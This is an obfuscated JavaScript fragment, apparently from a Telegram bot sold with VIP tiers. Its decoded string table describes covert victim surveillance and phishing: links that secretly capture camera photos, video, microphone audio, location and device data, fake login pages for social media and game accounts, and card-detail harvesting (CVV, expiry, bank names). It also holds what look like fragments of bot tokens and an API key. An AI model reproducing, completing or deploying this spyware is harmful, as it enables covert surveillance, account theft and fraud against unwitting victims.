    if (_0x13bde7[_0x3b2741(0x9c5)](isVIPUser, _0x2f9d88))
        return !![];
    if (linkUsage[_0xe8ee80] && _0x13bde7[_0x3b2741(0x4db)](linkUsage[_0xe8ee80][_0x3b2741(0xcae)], maxAttemptsPerButton))
        return ![];
    return !linkUsage[_0xe8ee80] && (linkUsage[_0xe8ee80] = { 'attempts': 0x0 }), linkUsage[_0xe8ee80][_0x3b2741(0xcae)]++, !![];
}
function _0x2612() {
    const _0x4a271f = [
        'راق\x20كامراة',
        'في\x20لعبة\x20أك',
        'store',
        'ZKUHX',
        '\x20لك\x0a\x20يوجد\x20',
        '🇦🇹',
        'express',
        'من\x20استخدام',
        'Cpuoi',
        'NEyZf',
        'ال\x20للتحقق\x20',
        ']\x2025%',
        'ر\x20أدناه\x20لت',
        '\x20المحظور\x20م',
        'KrIGY',
        'Generate\x20V',
        'n_proposit',
        'سالة\x20/star',
        '/start',
        'JOLQe',
        'iAEcM',
        'qPbDM',
        'أنثى',
        'قناة,رابط\x20',
        '\x20Mobile\x20Sa',
        'me/Almunha',
        'لهاتف\x20يشحن',
        'لذكاء\x20الاص',
        'remove_vip',
        'ffzkE',
        'أوزبكستان\x20',
        'iver',
        '\x20استخدام\x20ا',
        'حدثت\x20مشكلة',
        'ساب\x20🟢',
        'NJjuy',
        'lution',
        'https://iw',
        'لام\x20معلوما',
        'رض:\x20',
        'create_ema',
        '/?page=',
        'xIKkN',
        'text\x20to\x20sp',
        'uwrdJ',
        'DcNsI',
        '\x20إلى\x20التلغ',
        'add_vip',
        'inWWH',
        'cpuCores',
        '/submitNam',
        '\x20📡\x0a-\x20إمكان',
        'ated-drift',
        'ywZWb',
        'امرا\x20الخلف',
        '\x20قم\x20في\x20تعي',
        'م\x20الهاتف\x20☎️',
        'اعطيني\x20نكت',
        'ZraOy',
        'LrCzR',
        'uuSLI',
        'ناء\x20الزخرف',
        'الضحية\x20🎤',
        'ال\x20رابط\x20صح',
        '/n/?chatId',
        '0.0.0.0\x20Sa',
        'باكستان\x20🇵🇰',
        '\x20الرابط:\x20',
        'شتراك\x20في\x20ج',
        'لموقع\x20الجغ',
        'KyQnQ',
        'd\x20Bank',
        'goUnO',
        'hRwtX',
        'dotenv',
        'ن\x20العثور\x20ع',
        'ابط\x20لإضافة',
        'esponse',
        'Failed\x20to\x20',
        'YHASZ',
        'إرسالها.',
        'SIGHUP',
        'NMiVz',
        'removeChan',
        'SPEVj',
        'removeList',
        '\x20✋\x0a\x20\x20\x20\x20\x20\x20\x20',
        '=0.9',
        'BtecQ',
        'OPbZF',
        'ExBwA',
        'gqWVO',
        'wfTOd',
        'nkmWU',
        'أيرلندا\x20🇮🇪',
        'تخدم:\x20',
        'ميع\x20النقاط',
        'https://yo',
        '░░░░░░░░]\x20',
        'الأرجنتين\x20',
        'نيجيريا\x20🇳🇬',
        '\x20مدفوعاً،\x20',
        'fuAIY',
        'qPSng',
        'GKjbd',
        'redirect',
        'qdIQm',
        'وله\x20يمكنك\x20',
        'blog',
        'nLDPA',
        'أثناء\x20جلب\x20',
        'AeeXx',
        'vert\x20this\x20',
        'الإكوادور\x20',
        'IquBI',
        '\x20والحصول\x20ع',
        'zFVNv',
        'ت\x20بالصيغة:',
        '🔗\x20توليد\x20را',
        'BwRfO',
        'ذكر',
        'cIqpY',
        'https://ch',
        'com/answer',
        'كول\x20الأمان',
        'uFlfg',
        'ook:',
        '\x20🔵\x0a-\x20دعم\x20ا',
        '\x0a\x20\x20\x20\x20\x20\x20\x20\x20',
        'deexact/',
        '🇳🇨',
        'cheerio',
        'openai',
        '000',
        'ying\x20with\x20',
        'qgmyG',
        'طلب\x20الكود\x20',
        'راق',
        'ءة\x20ملف\x20الم',
        'llllllllll',
        'قناة2',
        'تريد\x20تحويل',
        'جمع\x20معلوما',
        '`\x0a*[-]\x20CVV',
        'Id\x20',
        '2-digit',
        'eRtIC',
        'لوحة\x20التحك',
        'filter',
        'art=1',
        'ه\x20الخيارات',
        '/fe/?chatI',
        'once',
        'هونغ\x20كونغ',
        'لمستخدم\x20',
        'MoUiR',
        'lPRZP',
        'كمبوديا\x20🇰🇭',
        'OJkpx',
        'type',
        'لجهاز:\x20',
        '📸\x20صورة\x20تم\x20',
        'UVGzt',
        '\x20كـ\x20VIP.',
        'answer_0',
        'uMvcV',
        'iTNbf',
        'vropp',
        'user_id',
        'LKRRN',
        'dorOR',
        'قه\x20عاليه:\x20',
        '🇨🇷',
        'انًا.',
        'on...\x0a[░░░',
        'راك\x20قناة\x20',
        'EwTFb',
        'ible-pract',
        'الدنمارك\x20🇩🇰',
        'تايلاند\x20🇹🇭',
        '\x20متوفر\x0a📛\x20ا',
        'RzIgc',
        'qDdju',
        '_6tJtI',
        'HvBFV',
        'LzDcT',
        'tRiFA4NzI0',
        'لجميع\x20المو',
        'صيد\x20يوزرت\x20',
        'igned-exch',
        'lrCWM',
        'HJJJJJSSSS',
        'dyjPm',
        'لصور\x20بنجاح',
        'nXISc',
        'لا\x20يوجد\x20اس',
        'كازاخستان',
        'facebook',
        'bAqsK',
        'ن\x20وتسجيل\x20ص',
        'userLink',
        '\x20🔄\x0a-\x20عمق\x20ا',
        'zXCxA',
        '\x20لاحقًا.',
        'ر:\x20',
        'بوك\x20🔮',
        'HStOA',
        '\x20الثانية)\x0a',
        'epeAw',
        'ميع\x20قنوات\x20',
        'QUMZO',
        'ل\x20إلى\x2030\x20ن',
        'yWsId',
        'يد\x20إذاعتها',
        'ال\x20للتحقق.',
        'jluQU',
        'bhkrZ',
        ']\x20100%',
        'ظره:',
        'ليتم\x20تفسير',
        'screenOrie',
        'NPuCb',
        'كاء\x20الاصطن',
        '/t/?chatId',
        'json',
        '\x20data.\x20Ple',
        'WKCUX',
        'ر\x20الدوله\x20ا',
        'OBCtF',
        'Unhandled\x20',
        '/i/?chatId',
        'YenYu',
        '\x20الضحيه\x20بد',
        'وجودة.',
        'ميات\x20الذي\x20',
        'AlbuW',
        '/submitVoi',
        'to\x20generat',
        'لزر\x20للحصول',
        'utf8',
        '/131.0.0.0',
        'تح\x20المميزا',
        'data',
        'tiktok.com',
        'PTMDs',
        '▓▓▓▓▓▓▓]\x201',
        'kvfbSITh',
        'جوزة',
        '\x20🖥️\x0a-\x20إصدار',
        'zTiZb',
        '\x20NT\x2010.0;\x20',
        'mShfg',
        'Error\x20proc',
        'VXzhZ',
        'dns',
        'wybOJ',
        'join',
        '\x20id,اسم\x20ال',
        'وامر\x20اخترا',
        'XathX',
        'إسبانيا',
        'male',
        'Sent\x20photo',
        'min',
        'kTofK',
        'TxJWN',
        'تم\x20تليغم\x20ا',
        'زخرفة\x20الاس',
        'ية\x20فيديو\x20🎥',
        'تغيير_الرق',
        'htRwU',
        'bchLB',
        'jAesM',
        'زيد\x20من\x20الص',
        'on...\x0a[▓▓▓',
        '/g.html?ch',
        'Bearer\x20sk-',
        'file',
        'غيل:\x20',
        'مرحبًا!\x20اض',
        'لم\x20يتم\x20إرس',
        'تم\x20فك\x20الحظ',
        'mdhaA',
        'getUserPro',
        'hxfsH',
        'ggbbk',
        'touchSuppo',
        'تفسير',
        'أستطع\x20تحوي',
        'hZMRI',
        'VylSQ',
        'NueGf',
        'غير\x20متوفر',
        'ت\x20القناة\x20ب',
        '\x20أثناء\x20إرس',
        'wHjLs',
        'AqNkV',
        'مرحبًا\x20بك\x20',
        'Data',
        'WfrOi',
        'ء\x20من\x20البحث',
        'fxoFO',
        '10mb',
        'ماء',
        '\x20(KHTML,\x20l',
        'م\x20مستخدم',
        'ZJMWe',
        'الرجاء\x20الم',
        'VMLbe',
        '📊\x20إحصائيات',
        'eMQbE',
        '0.5',
        'kAsxN',
        'مميز',
        'answer_3',
        'hNeRU',
        'إيران\x20🇮🇷',
        'سلوفاكيا\x20🇸🇰',
        'uUotS',
        '🇧🇯',
        'jKAxV',
        'فحص\x20الرواب',
        'اوت',
        'LnYuv',
        'creator',
        'jonfe',
        '\x20🤣',
        'dquRj',
        'Citibank',
        'attempts',
        'ar-EG',
        'اسم\x20المحطة',
        'ي\x20🕹',
        'pZUWB',
        'XvVQd',
        'AmbDQ',
        '\x20صور\x20من\x20ال',
        'sition',
        'mzmCk',
        'CndRd',
        'JJabm',
        '🇸🇻',
        'com/game',
        'ipYiG',
        'YGkdN',
        'dwVJU',
        'MXVTZ',
        'bNKLn',
        'localStora',
        '\x20مشاركتها.',
        'م\x20المستخدم',
        'aBbvY',
        'Received\x20d',
        'أنت\x20لست\x20ال',
        'SpvgL',
        'BTKdY',
        '\x20أثناء\x20جلب',
        '/xx',
        'الكاميرون\x20',
        'تم\x20تجاهل\x20ر',
        'تم\x20إنشاء\x20ا',
        'صوت\x20ذكر',
        'LuVNp',
        'sDCiL',
        'صله\x20اضع\x20في',
        '\x20⚠️',
        'qqZrQ',
        'OXBwM',
        'KFMow',
        'k.html',
        'ارساله\x20لضح',
        'غط\x20على\x20زر\x20',
        'mFqiR',
        'أفغانستان\x20',
        'لم\x20أتمكن\x20م',
        'HqHHq',
        'cTtEA',
        'حدث\x20خطاء\x20ا',
        '/mm',
        'حساب\x20جديد⚠️',
        'iFxYO',
        'وزر\x20جديد\x20✅',
        'jvxyw',
        'n/json',
        'EZNgS',
        'ية\x20📷',
        'تصوير\x20بدقه',
        'تم\x20تصنيفه\x20',
        'ahkoC',
        'التواصل\x20مع',
        'اصطناعي\x20🤖',
        'ل\x20كود\x20الرق',
        'vHvID',
        'تم\x20انشاء\x20ا',
        'تم\x20جعل\x20الب',
        'awaitingNa',
        'IxKdy',
        'Sent\x20video',
        'QgQTW',
        'rxPdm',
        'ge\x20Error:',
        '\x20هذا\x20البوت',
        'رابط\x20هذا:\x20',
        'تسجيل\x20صوت\x20',
        'Error\x20send',
        'تم\x20إضافة\x20ق',
        'response',
        'يه\x20بنجاح💀!',
        'NNjcm',
        'SUWzJ',
        'م\x20🔁',
        'عروفة',
        '\x20الذي\x20تريد',
        'name',
        '▓▓▓▓▓▓░░░░',
        'ستخدمين.',
        'me/)\x20\x0a*Pre',
        'rsXNn',
        'xbAkl',
        'bwZOr',
        'ماء\x20🗿',
        'add_channe',
        '9958',
        '*/*',
        'الملفات\x20ال',
        'rWzkl',
        'files',
        'https://de',
        '\x20🖥️\x0a-\x20وضع\x20ا',
        'ajmRz',
        'evoice.org',
        'ر\x0aاقتراحات',
        'zuSGo',
        '💀:\x0a\x0a',
        'ثور\x20على\x20اس',
        'يرجى\x20بدء\x20ا',
        'recordVoic',
        'match',
        'ndsnS',
        'k\x20:*\x20`',
        'vipUsers',
        'Frequency',
        'fJMqk',
        'fhVht',
        'تحويل\x20البو',
        'ck:',
        'penai',
        'CBxEF',
        'rshq_tikto',
        'toLowerCas',
        'FuBwb',
        '\x20نقطة\x20للوص',
        'إيطاليا\x20🇮🇹',
        '/submitCod',
        'NmQVs',
        'zNhtF',
        'CyFiO',
        '\x20المطور\x20@V',
        'إستونيا',
        'HRkWO',
        '&data={\x22op',
        'oRkgW',
        'rNmwn',
        '🇷🇺',
        'الراديو\x20📻',
        '11052300rUIFGg',
        'yIEUl',
        'QwXIL',
        '░░░░░░░░░░',
        'DEDwT',
        '🇦🇷',
        'foheo',
        'ر\x20رابط\x20🔒',
        'TAQKX',
        'RJiqo',
        'JHbOc',
        'tor',
        'JSCvo',
        'YYYTTTTIII',
        'XPndv',
        'AHMdq',
        'GTrAs',
        'OMbEc',
        'Kptir',
        '[▓▓░░░░░░░',
        'fuzAf',
        'خدمة:\x20',
        'إنشاء\x20📅\x20:\x20',
        'عبر\x20الرابط',
        'بط\x20جديد\x20',
        'PjzXc',
        'countries',
        'صي.',
        'ر\x20أدناه\x20لل',
        'callback_q',
        'browserVer',
        'creationDa',
        'QSNHL',
        'الدردشة\x20مع',
        'الرقام\x20وهم',
        'ماليزيا\x20🇲🇾',
        'RCiZU',
        'now',
        'iry\x20:*\x20`',
        'أرسل\x20لي\x20را',
        'axpEZ',
        '`\x0a*[-]\x20Car',
        'status',
        'search_ima',
        'init',
        'progressio',
        'session',
        'KmxtD',
        'QyOMf',
        'sgAeW',
        'تلغيم\x20رابط',
        'p-indol.ve',
        'finally',
        'ال\x20البيانا',
        'https://fl',
        'dXjDs',
        'getItem',
        'lfelo',
        '.com',
        'مستخدم:\x20',
        'dio...\x0a',
        'Wzxsj',
        'لموقع',
        'MPTHl',
        '/mm/?chatI',
        'jtJqm',
        'uQJql',
        'writeFileS',
        'إختراق\x20ببج',
        '\x20🌐\x0a-\x20إصدار',
        'Kit/537.36',
        'محطات\x20الرا',
        'dVHVo',
        '❓\x20لا\x20أعرف',
        'on/',
        'مستخدم\x20',
        'VVgaa',
        'icHhZ',
        'يه\x20الاصيله',
        'language',
        'cOkAz',
        '🇺🇸',
        'كازاخستان\x20',
        'fKiAM',
        'ss\x20the\x20but',
        'ة\x20الاتصال',
        '░░░░░░░]\x200',
        'NuunP',
        'LctRj',
        'static',
        'ب\x20شات\x20⭐',
        'و\x20حاول\x20مره',
        'zFggD',
        'قناة3',
        '\x20أي\x20رسالة\x20',
        '?limit=',
        '\x20الاتصال.',
        'FjhFe',
        'play',
        'xfArG',
        'administra',
        'checked',
        'معلومات\x20حس',
        'ستخدم:\x20غير',
        'في\x20',
        'البرتغال\x20',
        '🇦🇺',
        'ges',
        'لبنان\x20🇱🇧',
        'تصوير\x20الضح',
        'مرحبًا!\x20بك',
        '.\x0a\x20⚠️ملاحظه',
        'Pamoa',
        'menu',
        'فيتنام\x20🇻🇳',
        '\x0a\x20\x20\x20\x20\x20\x20\x20\x20•',
        'المغرب\x20🇲🇦',
        'use',
        'gcIaV',
        'https://t.',
        'اختراق\x20كام',
        'jyxQP',
        'nvite',
        'VYVyp',
        'لرجاء\x20المح',
        'ناء\x20إنشاء\x20',
        'EVwzy',
        'لهجه\x20اليمن',
        'كتابة\x20رسال',
        'extra',
        'ابط.',
        '⚠️\x20حدث\x20خطأ\x20',
        'osVersion',
        'MmNMb',
        'rbo',
        'Capital\x20On',
        'CVwwe',
        'XXJXYFFVVV',
        'لاستخراج',
        '\x20اسمك.',
        'e/apng,*/*',
        'التصنيف:\x20',
        '\x20🇹🇲',
        't.com/reso',
        'DbTIi',
        'uploads',
        'xx.html',
        'uery.',
        'لا\x20توجد\x20مح',
        'kfOum',
        'اختراق\x20ببج',
        '.36\x20(KHTML',
        '\x20موقع\x20الضح',
        'eText',
        'ابدأ\x20الاخت',
        'تم\x20إزالة\x20ا',
        'يره\x20جداً\x20ب',
        'ike\x20Gecko)',
        'photo',
        '🤔\x20ربما',
        'nAiyU',
        'lication/s',
        'KjmUa',
        't\x20قديمة\x20من',
        'https://co',
        'EVWkA',
        'المستخدم\x20ا',
        'abnvd',
        'tinyurl',
        'rpNjD',
        'EExUb',
        'جزر\x20فارو\x20🇫🇴',
        'NvAVj',
        'اول\x20مره\x20اخ',
        '\x0aرابط\x20البث',
        'ثور\x20على\x20ال',
        'iRaOz',
        'FccNh',
        'لهرسك\x20🇧🇦',
        'هونغ\x20كونغ\x20',
        'WYJxF',
        'رام.',
        'CbsvN',
        'olCbO',
        'TvPrU',
        'موناكو\x20🇲🇨',
        'QumBM',
        'تعامل\x20معه\x20',
        'فسير\x20ابن\x20س',
        'me/+4xfQ3c',
        'NuiFf',
        'OZkqf',
        'السويد',
        'qegAB',
        'تونس\x20🇹🇳',
        'ycEOJ',
        'countryFla',
        'essage',
        'wFLee',
        '837624gPudhZ',
        'fuschia-lo',
        'تم\x20تحويل\x20ا',
        'FISBf',
        'am\x20message',
        'RvjXw',
        'file_id',
        'لرابط\x20لختر',
        '\x20:*\x20`',
        'oKyxF',
        'أستراليا\x20🇦🇺',
        'TD\x20Bank',
        'iTGPE',
        ';q=0.8,en;',
        '?chatId=',
        'jvrYl',
        'wbWMr',
        '.\x20قم\x20بمشار',
        'WahqE',
        'hoOkR',
        'التحكم:',
        'CYrVV',
        'svUOG',
        'get_pubg',
        'LYFCX',
        '-\x20بوت\x20بحث\x20',
        'الرجاء\x20إرس',
        'Jcyiw',
        '\x20رقم\x20وهمي',
        'iBYIn',
        'OHeJl',
        'atId=',
        'radio_',
        '\x20الضحية\x20في',
        'dkGEG',
        'جداً\x20لا\x20تق',
        'values',
        'FhEHz',
        'QSvfG',
        'USpdW',
        'axios',
        '.com/',
        'AsUeN',
        'node-teleg',
        'NkEsS',
        'cel.app/',
        'خره\x20او\x20حاو',
        'اضغط\x20على\x20ا',
        'ل\x20عن\x20800حر',
        'lcRnw',
        'ank',
        'dio...\x0a[░░',
        '\x20وظهر\x20أنه\x20',
        'CMxAI',
        'DQgza',
        'اختراق\x20الم',
        'kUYKW',
        '\x0a📄\x20*الوصف:',
        'mm.html',
        'وت\x20الضحيه\x20',
        'nea.fr/BL_',
        'KraId',
        'ange;v=b3;',
        'me/VlP_12',
        'securityPr',
        'IxKuL',
        'ample.com/',
        'slodl',
        'snapchat.c',
        'ZNvpN',
        '\x20نقاط.\x20تحت',
        'كة\x20رابطك\x20ل',
        '\x20Visa...\x0a[',
        '🇸🇪',
        'إزالة\x20مستخ',
        'fpsUB',
        'PvChS',
        'instagram.',
        'check_link',
        'تم\x20حذف\x20الذ',
        '8010025jZDNcV',
        'ذا\x20\x20الرابط',
        'سنغافورة\x20🇸🇬',
        ':AAEAcl3oi',
        'قر\x20على\x20الز',
        'NAhwW',
        'lvKgl',
        'غوادلوب\x20🇬🇵',
        'LhXUQ',
        'ar-EG,ar;q',
        'OydlX',
        '\x20يزال\x20مشبو',
        '🎥\x20تم\x20تصوير',
        '\x20روبوتًا.',
        'وخاصه\x20اذا\x20',
        '🤔\x20*السؤال:',
        '▓▓▓▓▓▓▓▓▓▓',
        'iHEhI',
        'Vvhdh',
        'OQSIN',
        '🔍\x20يتم\x20فحص:',
        'RPRdA',
        'jzQpV',
        'mXSux',
        'صربيا',
        'ing\x20Telegr',
        'VoGWU',
        'n/xhtml+xm',
        'rQRuz',
        'zgkFH',
        'zfAaZ',
        ':AAELOAVm0',
        'gTQUn',
        ')\x0a\x20\x20\x20\x20\x20\x20',
        '/lo/?chatI',
        'المطور\x20قبل',
        'ه\x20فك\x20وتساب',
        'xtmpm',
        'ocuEv',
        'القيم\x20المط',
        'dOAvI',
        'رافي:\x20',
        'فشل\x20في\x20إرس',
        'CzuRG',
        'CYkCj',
        '\x20:\x20`',
        'ذكاء\x20اصطنا',
        'rXKum',
        'فعل.\x20انتظر',
        'SulJC',
        'ss.live',
        'aaWiu',
        'Euwie',
        'lo.html',
        'tiktok',
        'منغوليا\x20🇲🇳',
        'راقبه',
        '\x0a\x0a📍\x20خط\x20الع',
        'send',
        '\x20🏙️\x0a-\x20عنوان',
        'nZGUG',
        'XlYii',
        'رمز_الدولة',
        'باري',
        '1802670IfxRAm',
        '\x20رابط\x20لالت',
        'gram:',
        '/ca',
        'الحصول\x20الم',
        '\x20موجود:\x20',
        'زامبيا\x20🇿🇲',
        'maBaE',
        'رجاء\x20\x20عدم\x20',
        'bknEG',
        'HfvFy',
        'الرجاء\x20الا',
        'body',
        'c.html',
        'channels.j',
        'ing\x20photos',
        'ue\x20:*\x20`',
        'شبه\x20رباعية',
        'cYfNh',
        'KqFxX',
        'YfmHi',
        'every',
        'setItem',
        '.sender',
        'حث\x20عن\x20الصو',
        'د\x20الازرق\x20🧞‍♂️',
        'يد\x20اليوزرا',
        'bFtym',
        '[▓▓▓▓░░░░░',
        'سلوفينيا\x20🇸🇮',
        'vXZLO',
        'bhaLO',
        'بنغلاديش\x20🇧🇩',
        'لى\x20محطات\x20ا',
        'يه\x20☎️',
        'Chase\x20Bank',
        'نيبال\x20🇳🇵',
        'wodHP',
        'مولدوفا\x20🇲🇩',
        '👤\x20*الشخصية',
        ']\x2050%',
        'سم\x20الحساب:',
        'ntation',
        'قبرص\x20🇨🇾',
        'set_free',
        'أرسل\x20الاسم',
        'UxcoN',
        'dxBGJ',
        'جعل\x20البوت\x20',
        'يه\x20لمعرفة\x20',
        'Ademj',
        'ISbBs',
        'MPsAI',
        'wUJjm',
        'كندا\x20🇨🇦',
        'بورتوريكو\x20',
        'ة:\x20',
        'deviceType',
        'ميانمار\x20🇲🇲',
        '\x20المطور',
        'هاتف\x20هذا\x20ق',
        'g.html',
        'fgcKT',
        'ZFAQV',
        '*الايدي\x20:\x20',
        '[▓▓▓▓▓▓▓▓▓',
        'osPBl',
        'kLCYv',
        'بلوتوث:\x20',
        '`\x0a*[-]\x20Exp',
        '\x20🇨🇮',
        'OVoGW',
        'uGaFT',
        'شرح\x20البوت\x20',
        ':AAFKO5HHo',
        'اعي:\x20',
        'رسال\x20رسالة',
        'وت\x20مجاني.',
        'EStzH',
        'الضحيه\x20📲',
        'Ttkhg',
        'skOPc',
        'RMiay',
        'ylJSW',
        'SpIDe',
        'نيكاراغوا\x20',
        'JaqmM',
        'ئمة\x20الاشتر',
        'ekNkW',
        '/submitPho',
        'IYvIh',
        'روسيا',
        'vzVQk',
        'ال\x20الأسماء',
        'message',
        'AUnoF',
        '2DOs-Fgdwp',
        'uRmfV',
        'حذف\x20الملف\x20',
        'prev_',
        'UfPaa',
        'qrHIW',
        'تم\x20تلغيم\x20ه',
        'القائمة:\x20',
        'hostname',
        'mdRZqoXRZ_',
        'zQWZl',
        'ه\x20بواسطة\x20ا',
        'SBuju',
        'q=0.7',
        'tvfxN',
        '➖\x20رقم\x20الها',
        'أدخل\x20معرف\x20',
        'بواسطة\x20ابن',
        '.mp4',
        '\x0a👤\x20معرف\x20ال',
        'UAyex',
        'ception',
        'TOWSr',
        'جرب\x20دوله\x20ا',
        'إنشاء\x20إيمي',
        'مالي\x20🇲🇱',
        'كوستاريكا\x20',
        'اختراق\x20عبر',
        'single',
        'UwGby',
        'تخدمين:\x20',
        'NpfYD',
        'يتك\x20في\x20الد',
        '100mb',
        'نيوزيلندا\x20',
        'لفحصه.',
        'المزيد',
        'captureFro',
        'tXoiP',
        'لاتفيا\x20🇱🇻',
        'ماليزيا\x20',
        'contact',
        'parse',
        '\x20🇰🇬',
        'LdZjy',
        'php',
        'tZjmy',
        'details:\x20',
        'موزمبيق\x20🇲🇿',
        'pmlEN',
        'nVuOC',
        'find',
        'bbdaA',
        'city',
        'لنسخها.',
        'English\x20te',
        'AcqcD',
        'QAOVX',
        'results',
        'rif2bot?st',
        'app/',
        '\x20فاير\x20👾',
        'عمان\x20🇴🇲',
        'RCSOJ',
        'خرى\x20لاحقًا',
        'الصور.',
        'Markdown',
        'yAURv',
        'editMessag',
        'Fifth\x20Thir',
        '🇦🇫',
        'uwHHq',
        ',اسم\x20القنا',
        'pLFtD',
        'kicked',
        'مية\x20📸',
        'rm-urlenco',
        'وشكرا.',
        'لى\x20رابط\x20ال',
        'بريطانيا',
        'mqQeo',
        'l,applicat',
        'VZlQr',
        'خطأ.',
        '/completio',
        'Erdtj',
        'إرسال\x20إذاع',
        'تاريخ_الإن',
        'النرويج\x20🇳🇴',
        'هولندا\x20🇳🇱',
        'wIkGB',
        '&type=tikt',
        'YFEno',
        'dream_menu',
        'ploqB',
        'حث.',
        'push',
        'xTIbc',
        'query',
        'HIiMJ',
        'ب\x20🛎•\x20\x0a',
        'مدغشقر\x20🇲🇬',
        'آمن.',
        'pqMev',
        'لا\x20توجد\x20صو',
        'الصومال\x20🇸🇴',
        'غرينلاند\x20🇬🇱',
        'اكرة\x20المؤق',
        'jpg',
        'تم\x20إضافة\x20ا',
        'txtdv',
        'test',
        'تم\x20',
        'oWLua',
        'لمعرفة\x20نقا',
        'onrender',
        'me/ZI0_bot',
        'VrVdT',
        'd\x20مطلوب',
        '5Iw5wkVItL',
        'Pnxvr',
        'me/ygf2gbo',
        'خطأ\x20في\x20قرا',
        'pin',
        'بنين',
        'OFqhC',
        'QeqpVITG3K',
        'الصور\x20الرا',
        'deviceName',
        'أذربيجان\x20',
        'لألوان:\x20',
        'SiQjr',
        'GZIjN',
        'code',
        'HCTWL',
        'اسم_الدولة',
        'soUgd',
        'max',
        'omNPO',
        'kufSI',
        'FcUwf',
        '\x20•\x20التصنيف',
        'nAvailable',
        '\x20على\x20رقم\x20و',
        'صطناعي\x20🤖',
        'qOpXf',
        'URWNe',
        'ير\x20هذا\x20الر',
        'ة\x20أخرى.',
        '\x20المطور\x20👨‍🎓',
        'KOIyC',
        'ناء\x20محاولة',
        'عر\x2030\x20نقطة',
        'aPHcq',
        'روسيا\x20🇷🇺',
        'isCharging',
        'entries',
        '\x20سيرين:\x20',
        'ساب:\x20',
        'rg/en/byco',
        '-umber.ver',
        'ضحيه\x20:\x0a\x0a',
        'أدناه\x20للبح',
        'PEkrm',
        'علم_الدولة',
        '\x20مدفوعة\x20بس',
        'VQVdz',
        'مجاني',
        'lookup',
        'ycxUm',
        'اختر\x20نوع\x20ا',
        'لاوس\x20🇱🇦',
        'YPFij',
        '\x20للمتصفح:\x20',
        'nNqZJ',
        'سو\x20🇧ﺫ',
        'تغيير\x20الرق',
        'om/v1/chat',
        'EPwQj',
        'mribG',
        'date',
        'RsBvL',
        'بنجاح.',
        'ال\x20معرف\x20ال',
        'add_nammes',
        'JyLcx',
        '7770066795',
        'LviRo',
        '*ابدأ\x20اللع',
        'oXwhb',
        'bott',
        'hTiIw',
        '\x20الحصول\x20عل',
        'QceDj',
        'اق\x20المكرفو',
        'XxaWW',
        'حدث\x20خطأ\x20:\x20',
        'NFmVB',
        'تم\x20الصيد\x20ب',
        '\x20GB\x20💾\x0a-\x20عد',
        'gzKQR',
        '\x20📅\x0a-\x20بروتو',
        'غير\x20قابل\x20ل',
        '==========',
        'catch',
        'Error\x20fetc',
        '\x20يوزرات\x20مح',
        'VBYQu',
        'ta\x20found\x20o',
        '\x20توك\x20📳',
        'ب*\x20للبدء.',
        'hw.vercel.',
        'https://fo',
        'tXQBx',
        '\x20اخره\x20لاحق',
        'ومات\x20جهازك',
        'blyTb',
        '🤣🤣🤣🤣',
        'mhDyM',
        'المجر\x20🇭🇺',
        'ZKVup',
        'remove_cha',
        'USsqN',
        'HKyvD',
        'مرحباً!\x20اض',
        'إلغاء\x20اشتر',
        'banUser',
        'TNPOT',
        'عذرًا،\x20لم\x20',
        '\x20الجهاز:',
        'ر\x20لجمع\x20معل',
        'AILWM',
        'https://ph',
        'BqhwH',
        'n.html',
        'collect_de',
        'ن\x20التعامل\x20',
        '\x0a📏\x20الدقة:\x20',
        'NdoIG',
        'ilpoW',
        'أدخل\x20بيانا',
        'message_id',
        'get_photo_',
        'zFrAN',
        'BgWIb',
        'OVPLb',
        'FKAlL',
        'أدخل\x20الرسا',
        'الية\x20🇰🇵',
        'xbZfQ',
        '\x20من\x20VIP.',
        'female',
        'anding-mas',
        'rnCJP',
        'cPewT',
        'ETxPz',
        'semi_quad',
        'semi_tripl',
        'لة\x20التي\x20تر',
        'www',
        'PhrHc',
        'بنين\x20🇧🇯',
        'eReplyMark',
        'LOwlz',
        'ق\x20كامراة\x20م',
        'البحرين\x20🇧🇭',
        'LeVOT',
        'CciDg',
        '\x20صوت.',
        'تايوان\x20🇹🇼',
        '🇳🇿',
        '\x20:\x20',
        'Verificati',
        '.msg\x20span',
        'هندوراس\x20🇭🇳',
        '\x20كل\x20الازرا',
        'fKEYO',
        'نة:\x20',
        'ة,رابط\x20الد',
        'ban_user',
        'يوزرات\x20ربا',
        'تركين.',
        'SLiyO',
        'ain\x20later.',
        'IhTxP',
        'tCDoJ',
        'له\x20🌏\x20:\x20',
        'سحب\x20جميع\x20ا',
        '\x20فارغة\x20في\x20',
        'قناة\x20بالمع',
        'VmABQ',
        'memoryStor',
        'ل\x20النص\x20إلى',
        'لم\x20يتم\x20الع',
        'aklnn',
        'online',
        'HMJJX',
        'male_voice',
        'jQqmd',
        'بيانات\x20ناق',
        'INMNe',
        '\x20على\x20الزر\x20',
        ')\x20AppleWeb',
        'لراديو.',
        'jtoMQ',
        '\x20المتصفح:\x20',
        'hing\x20user\x20',
        '\x20محاولة،\x20',
        'deviceInfo',
        '.live/mess',
        'أنت\x20محظور\x20',
        'رجيه\x20لكتشا',
        'مالطا\x20🇲🇹',
        'ehVmv',
        'غانا\x20🇬🇭',
        'المميزات\x20⛔',
        '(\x27session\x27',
        't.me/',
        'ناميبيا\x20🇳🇦',
        'bxFMB',
        'املاً\x20قم\x20ب',
        'EWznw',
        'YprHb',
        'Yujzn',
        'deo',
        'PglWo',
        '\x20المراقبه\x20',
        'uploads/',
        'capture_vi',
        'Invalid\x20re',
        'bSWju',
        'ختلفه\x20او\x20ح',
        'إضافة\x20قناة',
        '\x20🇰🇾',
        'afVaP',
        '👨🏻‍🏫',
        'voice',
        '\x20📏\x0a-\x20إصدار',
        'جورجيا\x20🇬🇪',
        'enlfV',
        'pmJvP',
        'لصورة\x20بنجا',
        'قطر\x20🇶🇦',
        'أمريكا',
        '\x0a➖\x20تم\x20الطل',
        'set_paid',
        'userId',
        'LcbPJ',
        'uorescent-',
        'qQSSo',
        'قاط\x20الصور.',
        'ة\x20عبر\x20رابط',
        'حدث\x20خطأ:\x20',
        'No\x20photos\x20',
        '\x20غير\x20متوفر',
        'صال:\x20',
        'رير\x20🧠',
        '\x20for\x20chatI',
        'اك\x20الإجبار',
        'MADAX',
        'Pqupw',
        'zNCGb',
        'EXYXT',
        'bWqbd',
        'ة\x20سيتم\x20فتح',
        'generate_v',
        '/json',
        'مؤقتة.',
        'ات\x20المفحوص',
        '🇨🇲',
        'glitch',
        'الصيغة:\x20id',
        'sPrPF',
        'com/api/ch',
        'ال\x20صور.',
        '\x20متر',
        'طلب\x20اي\x20اذن',
        'filePhotos',
        'التشيك\x20🇨🇿',
        'uTPXb',
        'ن\x20🇩🇴',
        'https://re',
        'phone_numb',
        'ترينيداد\x20و',
        '\x20المستخدم:',
